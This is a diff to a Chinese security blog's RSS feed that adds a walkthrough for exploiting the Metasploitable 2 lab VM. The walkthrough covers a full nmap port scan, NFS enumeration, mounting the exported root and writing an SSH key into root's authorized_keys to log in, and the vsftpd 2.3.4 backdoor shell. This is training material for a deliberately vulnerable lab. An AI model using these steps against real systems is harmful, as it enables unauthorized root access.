@@ -5,9 +5,95 @@
     <description>韬光养晦 厚积薄发</description>
     <link>https://havysec.github.io/</link>
     <atom:link href="https://havysec.github.io/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Thu, 12 Oct 2017 12:45:52 -0400</pubDate>
-    <lastBuildDate>Thu, 12 Oct 2017 12:45:52 -0400</lastBuildDate>
+    <pubDate>Wed, 18 Oct 2017 11:36:23 -0400</pubDate>
+    <lastBuildDate>Wed, 18 Oct 2017 11:36:23 -0400</lastBuildDate>
     <generator>Jekyll v3.1.1</generator>
+    
+      <item>
+        <title>Metasploitable2-Exploitability-Guide</title>
+        <description>&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/havysec/havysec.github.io/master/_posts/post_image/2017-10-16/1.png&quot; alt=&quot;rapid7&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;metasploitable-2-&quot;&gt;内容：metasploitable 2 利用笔记&lt;/h3&gt;
+
+&lt;p&gt;暂时不包括对web应用和服务的利用&lt;/p&gt;
+
+&lt;p&gt;环境搭建: VMware 虚拟机&lt;a href=&quot;https://information.rapid7.com/metasploitable-download.html&quot;&gt;下载地址&lt;/a&gt;  注册信息随便写，或者&lt;a href=&quot;https://metasploit.help.rapid7.com/docs/metasploitable-2&quot;&gt;直接下载&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;metasploitable 2 用户名密码&lt;code class=&quot;highlighter-rouge&quot;&gt;msfadmin&lt;/code&gt;/&lt;code class=&quot;highlighter-rouge&quot;&gt;msfadmin&lt;/code&gt;.登陆后查看地址&lt;code class=&quot;highlighter-rouge&quot;&gt;ifconfig&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/havysec/havysec.github.io/master/_posts/post_image/2017-10-16/2.png&quot; alt=&quot;ifconfig&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p style=&quot;color: #FF2D2D&quot;&gt;
+&lt;strong&gt;打开kali用nmap扫描该地址开启的端口和服务以及服务版本:`nmap -p1-65535 -sV 192.168.227.128`&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/havysec/havysec.github.io/master/_posts/post_image/2017-10-16/3.png&quot; alt=&quot;nmap&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;得到很多开启的服务及端口信息,这正是我们需要的.&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;port-2049-nfsnetwork-file-system-&quot;&gt;PORT: 2049 NFS(Network File System) 网络文件系统&lt;/h3&gt;
+
+&lt;p&gt;使用&lt;code class=&quot;highlighter-rouge&quot;&gt;rpcinfo&lt;/code&gt;判断&lt;code class=&quot;highlighter-rouge&quot;&gt;NFS&lt;/code&gt;服务是否开启，再用&lt;code class=&quot;highlighter-rouge&quot;&gt;showmount -e&lt;/code&gt; 判断&lt;code class=&quot;highlighter-rouge&quot;&gt;linux&lt;/code&gt;系统根目录是否被共享和可以挂载.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# rpcinfo -p 192.168.227.128
+# showmount -e 192.168.227.128
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/havysec/havysec.github.io/master/_posts/post_image/2017-10-16/4.png&quot; alt=&quot;NFS&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;通过挂载远程服务器的根目录，再写入文件。这里选择写入ssh公钥用ssh私钥直接进行登录。&lt;/p&gt;
+
+&lt;p&gt;创建公私钥&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# ssh-keygen -t rsa    
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/havysec/havysec.github.io/master/_posts/post_image/2017-10-16/5.png&quot; alt=&quot;ssh-keygen&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;挂载共享目录到本地，再将公钥重命名写到指定目录，用私钥登录&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# mount -t nfs 192.168.227.128:/ /tmp/
+# cat id_rsa.pub &amp;gt;&amp;gt; /tmp/root/.ssh/authorized_keys
+# umount /tmp
+# ssh 192.168.227.128
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/havysec/havysec.github.io/master/_posts/post_image/2017-10-16/6.png&quot; alt=&quot;ssh&quot; /&gt;&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;port-21-vsftpd-234&quot;&gt;PORT: 21 vsftpd-2.3.4&lt;/h3&gt;
+&lt;p&gt;该版本包含一个后门，如果一个用户名被传入最后包含&lt;code class=&quot;highlighter-rouge&quot;&gt;:)&lt;/code&gt;，该版本会在6200端口监听一个shell，可以用telnet或者msf测试这个漏洞&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/havysec/havysec.github.io/master/_posts/post_image/2017-10-16/7.png&quot; alt=&quot;telnet&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/havysec/havysec.github.io/master/_posts/post_image/2017-10-16/8.png&quot; alt=&quot;msfconsole&quot; /&gt;&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;port-6667&quot;&gt;PORT: 6667&lt;/h3&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+</description>
+        <pubDate>Mon, 16 Oct 2017 00:00:00 -0400</pubDate>
+        <link>https://havysec.github.io/2017/10/Metasploitable2-Exploitability-Guide/</link>
+        <guid isPermaLink="true">https://havysec.github.io/2017/10/Metasploitable2-Exploitability-Guide/</guid>
+        
+        <category>安全靶场通关</category>
+        
+        
+      </item>
     
       <item>
         <title>随便写写</title>
